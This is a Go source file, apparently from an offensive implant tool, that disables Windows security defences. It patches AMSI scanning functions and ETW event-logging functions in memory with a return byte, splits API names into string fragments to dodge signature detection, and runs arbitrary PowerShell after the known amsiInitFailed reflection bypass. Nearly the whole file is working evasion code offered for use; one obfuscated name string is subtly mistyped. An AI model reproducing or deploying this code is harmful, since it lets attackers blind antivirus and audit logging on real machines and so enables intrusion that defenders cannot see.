package bypass

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
	"time"
	"log"
	"golang.org/x/sys/windows"

)


// original source : https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go

func PatchAmsi() error {
	// load amsi.dll
	amsiDLL := windows.NewLazyDLL("a"+"msi.dl"+"l")
	amsiScanBuffer := amsiDLL.NewProc("A"+"m"+"s+"+"i"+"S"+"ca"+"nBu"+"ffer")
	amsiInitialize := amsiDLL.NewProc("Ams"+"iIn"+"iti"+"alize")
	amsiScanString := amsiDLL.NewProc("Am"+"s"+"i"+"ScanString")

	// patch
	amsiAddr := []uintptr{
		amsiScanBuffer.Addr(),
		amsiInitialize.Addr(),
		amsiScanString.Addr(),
	}
	patch := byte(0xC3)
	for _, addr := range amsiAddr {
		// skip if already patched
		if *(*byte)(unsafe.Pointer(addr)) != patch {
			// {{if .Config.Debug}}
			log.Println("Patching AMSI")
			// {{end}}
			var oldProtect uint32
			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
			if err != nil {
				//{{if .Config.Debug}}
				log.Println("VirtualProtect failed:", err)
				//{{end}}
				return err
			}
			*(*byte)(unsafe.Pointer(addr)) = 0xC3
			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
			if err != nil {
				//{{if .Config.Debug}}
				log.Println("VirtualProtect (restauring) failed:", err)
				//{{end}}
				return err
			}
		}
	}
	return nil
}


// PwshCmdAmsiPassby runs a PowerShell command while bypassing AMSI and returns only the command output.
func PwshCmdAmsiPassby(command string) (string, error) {
	// List of PowerShell commands to disable AMSI and execute the given command.
	commands := []string{
		`$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`,
		`$b = $a.GetField('amsiInitFailed','NonPublic,Static')`,
		`$b.SetValue($null,$true)`,
		command,
	}

	// Prepare PowerShell execution.
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass")

	// Capture stdout and stderr.
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	// Get a pipe to PowerShell’s standard input.
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", fmt.Errorf("failed to obtain stdin pipe: %v", err)
	}

	// Start PowerShell process.
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start PowerShell: %v", err)
	}

	// Write commands line by line.
	for _, c := range commands {
		_, err := stdin.Write([]byte(c + "\n"))
		if err != nil {
			return "", fmt.Errorf("failed to write command: %v", err)
		}
		time.Sleep(300 * time.Millisecond) // Small delay to allow execution.
	}

	// Close stdin to signal end of commands.
	stdin.Close()

	// Wait for PowerShell to finish execution.
	if err := cmd.Wait(); err != nil {
		return "", fmt.Errorf("PowerShell execution error: %v; stderr: %s", err, errBuf.String())
	}

	// Process output: clean up unwanted lines.
	outputLines := strings.Split(outBuf.String(), "\n")

	// Extract last meaningful line (actual command output).
	for i := len(outputLines) - 1; i >= 0; i-- {
		line := strings.TrimSpace(outputLines[i])
		if line != "" && !strings.Contains(line, "PS C:") { // Skip empty lines and PowerShell prompts.
			return line, nil
		}
	}

	return "", fmt.Errorf("no valid output received")
}


func EtwPatchedMe() {
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")

    // Load critical functions
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

    // List of ETW functions to patch
    etwFuncs := []*syscall.LazyProc{
        ntdll.NewProc("EtwE+"+"ventW"+"rite"),
        ntdll.NewProc("Etw"+"Even"+"tWri"+"teEx"),
        ntdll.NewProc("Et"+"wEv"+"ent"+"Wri"+"teF"+"ull"),
    }

    patch := []byte{0xC3} 

    // Get the current process handle properly
    //currentProcess := uintptr(syscall.GetCurrentProcess())

    currentHandle, err := syscall.GetCurrentProcess()
    if err != nil {
        fmt.Printf("GetCurrentProcess failed: %v\n", err)
        return
    }
    currentProcess := uintptr(currentHandle)

    for _, proc := range etwFuncs {
        addr := proc.Addr()
        var oldProtect uint32

        // Adjust memory permissions to allow writing
        ret, _, err := VirtualProtect.Call(
            addr,
            uintptr(len(patch)),
            syscall.PAGE_EXECUTE_READWRITE,
            uintptr(unsafe.Pointer(&oldProtect)),
        )
        if ret == 0 {
            fmt.Printf("VirtualProtect failed: %v\n", err)
            continue
        }

        // Applay patch
        ret, _, err = WriteProcessMemory.Call(
            currentProcess,
            addr,
            uintptr(unsafe.Pointer(&patch[0])),
            uintptr(len(patch)),
            0,
        )
        if ret == 0 {
            fmt.Printf("WriteProcessMemory failed: %v\n", err)
            continue
        }

        // Restoring
        ret, _, err = VirtualProtect.Call(
            addr,
            uintptr(len(patch)),
            uintptr(oldProtect),
            uintptr(unsafe.Pointer(&oldProtect)),
        )
        if ret == 0 {
            fmt.Printf("VirtualProtect (restore) failed: %v\n", err)
            continue
        }
    }
}

/*
func PwshCmd(command string) (string, error) {
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command)

	outputt, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("error executing command: %v\nOutput: %s", err, string(outputt))
	}

	return string(outputt), nil
}
*/
